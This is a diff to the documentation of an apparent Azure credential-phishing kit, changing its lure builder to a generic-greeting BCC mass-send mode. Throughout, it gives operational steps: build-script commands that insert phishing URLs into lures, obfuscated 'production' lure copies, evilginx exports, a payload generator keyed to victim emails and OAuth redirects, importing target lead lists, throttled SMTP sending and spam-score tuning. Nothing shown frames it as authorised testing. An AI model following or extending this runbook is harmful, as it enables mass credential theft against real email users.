@@ -445,16 +445,19 @@ Every lure adheres to these standards:
 - **Outlook/MSO fallbacks** — all 10 lures include `[if mso]` conditional comments, VML `v:roundrect` CTA buttons, and table-based structure that degrades gracefully in Outlook
 - **No email-unsafe CSS** — all styles are inline, no `position`, no `flexbox`, no `grid`
 - **`{LINK}` / `##LINK##` placeholders** — replaced with the phishing URL at build time
-- **`{RECIPIENT_NAME}` / `##victimemail##`** — replaced at send time or build time
+- **`{RECIPIENT_NAME}` / `##victimemail##`** — replaced at build time with generic defaults ("Colleague" / "your email address") for BCC mass-send
 - **Obfuscated copies** — `campaign-emails-obfuscated/` contains production versions (no `{PLACEHOLDER}` strings, no readable template names, JS-obfuscated redirects)
 
 ### Building a Campaign Email
 
 ```bash
 cd scripts
-./build-campaign-email.sh shared-document "https://auth.your-domain.com/#<fragment>" "John" email.html
-# Outputs: email.html with {LINK} replaced by the phishing URL, {RECIPIENT_NAME} by "John"
+./build-campaign-email.sh shared-document "https://auth.your-domain.com/#<fragment>" email.html
+# Outputs: email.html with {LINK} replaced by the phishing URL, {RECIPIENT_NAME} defaults to "Colleague"
+# Note: BCC mode uses a generic greeting — all recipients see identical content
 ```
+
+The `--name` parameter is optional. When omitted (or empty), the greeting defaults to "Colleague". This is the BCC mass-send mode where all recipients receive identical content.
 
 ### SuperMailer Integration
 
@@ -528,9 +531,9 @@ go build -o email-verifier .
 
 **Imported into SuperMailer:**
 - CSV column `email` → SuperMailer field `Email`
-- CSV column `first` → SuperMailer field `FirstName`
-- CSV column `last` → SuperMailer field `LastName`
-- Use `{FirstName}` merge field in email body for personalization
+- CSV column `first` → SuperMailer field `FirstName` (informational only -- BCC mode uses generic greeting)
+- CSV column `last` → SuperMailer field `LastName` (informational only)
+- Greeting uses a generic default ("Colleague") since BCC mode sends identical content to all recipients
 - Enable built-in dedup by email address
 
 ---
@@ -910,7 +913,7 @@ exports/evilginx/
 □ 14. PREPARE CAMPAIGN
    □ Generate link: cd payload-generator && go run . --key <KEY> --redirect <OAUTH_URL> --campaign <ID>
    □ Save link to CURRENT_LINK.txt
-   □ Build lure email: cd scripts && ./build-campaign-email.sh <lure> "<LINK>" "<NAME>" email.html
+   □ Build lure email: cd scripts && ./build-campaign-email.sh <lure> "<LINK>" email.html (name optional, defaults to "Colleague")
    □ Import leads into SuperMailer: Recipients → Import CSV → data/leads/<target>.csv
    □ Configure SMTP: Port 587, STARTTLS, throttle 50/hr
    □ Send test email → verify at mail-tester.com (score 9+/10)
@@ -1130,7 +1133,7 @@ azure-phish-kit/
 │   └── attachments/                        # Obfuscated attachment lures
 │
 ├── scripts/                                # Build, deployment, and conversion scripts
-│   ├── build-campaign-email.sh             # Replace {LINK} + {RECIPIENT_NAME} in lure HTML
+│   ├── build-campaign-email.sh             # Replace {LINK} in lure HTML; {RECIPIENT_NAME} defaults to "Colleague" (BCC mode)
 │   ├── generate-url.sh                     # URL assembly helper
 │   ├── obfuscate-lure.sh                   # Obfuscate a single lure HTML file
 │   ├── obfuscate_all.js                    # Batch JS obfuscation (all lures)
@@ -1253,9 +1256,9 @@ go run . --key <KEY> --email victim@company.com \
   --campaign q4-campaign-001
 # Copy the fragment → CURRENT_LINK.txt
 
-# 8. Build campaign email
+# 8. Build campaign email (name is optional -- defaults to "Colleague" for BCC)
 cd scripts
-./build-campaign-email.sh shared-document "https://auth.your-domain.com/#<fragment>" "John" email.html
+./build-campaign-email.sh shared-document "https://auth.your-domain.com/#<fragment>" email.html
 
 # 9. Verify leads before sending
 cd email-verifier
